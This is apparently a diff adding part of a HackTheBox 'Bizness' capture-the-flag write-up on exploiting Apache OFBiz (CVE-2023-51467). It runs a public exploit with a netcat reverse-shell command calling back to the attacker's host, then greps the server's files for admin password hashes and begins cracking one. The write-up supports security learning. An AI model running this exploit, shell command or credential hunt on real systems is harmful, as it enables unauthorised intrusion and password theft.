@@ -82,3 +82,91 @@ Coded By: K3ysTr0K3R
 CVE-2023-51467
 ```
 So now that I have a major vulnerability, I need to set it up to execute a reverse shell.
+
+## Getting onto the machine
+After some testing, I realized I would need a java vulnerability to get an RCE. So I found another PoC that would actually let me execute a command. (Thank you jakabakos)
+
+```bash
+git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
+cd Apache-OFBiz-Authentication-Bypass
+python exploit.py --url https://bizness.htb --cmd 'nc -c bash $HOST 1337'
+
+# second shell
+ncat -lvnp 1337
+```
+### User flag
+This makes getting a shell super easy. So no problem, `cat /home/ofbiz/user.txt`
+
+
+
+## Privilege Escalation
+Oh boy, this was another failed attempt at trying to find this without a hint. I attempted `linpeas.sh` again, but I couldn't see anything that stood out.
+
+So after looking at another HTB, I realized they referenced a file named `AdminUserLoginData.xml` So I do my best to find it without looking.
+
+```
+#find /opt/ofbiz -iname "Admin*xml";
+
+/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xmliname "Admin*xml"
+/opt/ofbiz/framework/resources/templates/AdminNewTenantData-PostgreSQL.xml
+/opt/ofbiz/framework/resources/templates/AdminNewTenantData-Oracle.xml
+/opt/ofbiz/framework/resources/templates/AdminNewTenantData-Derby.xml
+/opt/ofbiz/framework/resources/templates/AdminNewTenantData-MySQL.xml
+```
+I find the file and this is what is inside.
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+Licensed to the Apache Software Foundation (ASF) under one
+or more contributor license agreements.  See the NOTICE file
+distributed with this work for additional information
+regarding copyright ownership.  The ASF licenses this file
+to you under the Apache License, Version 2.0 (the
+"License"); you may not use this file except in compliance
+with the License.  You may obtain a copy of the License at
+
+http://www.apache.org/licenses/LICENSE-2.0
+
+Unless required by applicable law or agreed to in writing,
+software distributed under the License is distributed on an
+"AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
+KIND, either express or implied.  See the License for the
+specific language governing permissions and limitations
+under the License.
+-->
+
+<entity-engine-xml>
+    <UserLogin userLoginId="@userLoginId@" currentPassword="{SHA}47ca69ebb4bdc9aa
+e0adec130880165d2cc05db1a" requirePasswordChange="Y"/>
+```
+Interesting, we know the format for the password. So I'm going to attempt my own hash crack.
+
+### Trying to find the root password (encrypted)
+
+```
+grep -arin -o -E '(\w+\W+){0,5}password(\W+\w+){0,5}' . #get this grep from: https://techyrick.com/bizness-hackthebox-writeup/#privilege-escalation
+
+#output
+/c6850.dat:85:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Ypython-requests
+./c5fa1.dat:4:PASSWORDSEPERATOR_LINESEPERATOR_TEXTSTATE_PROVINCE
+./c180.dat:87:SYSCS_CREATE_USEuserNampasswordVARCHAR
+./c180.dat:87:PASSWORD&$c013800d-00fb-2649-07ec-000000134f30
+./c180.dat:87:SYSCS_RESET_PASSWORuserNampasswordVARCHAR
+./c180.dat:87:PASSWORD&$c013800d-00fb-2649-07ec-000000134f30
+./c180.dat:87:SYSCS_MODIFY_PASSWORpasswordVARCHAR
+./c54d0.dat:21:Password="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled
+```
+another version of grep gives me the full line
+```
+./c54d0.dat:21:Password="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 0
+3:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
+```
+
+`$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I` here is the password! UPDATE: realized I was missing a trailing `=`. Why it took forever for my crack to work. unsure why the trailing `=` isn't in the output. Something to learn in the future.
+
+
+
+
+Now, can I crack the password? If I can, then I can easily get the root flag.
+### Cracking the salted password
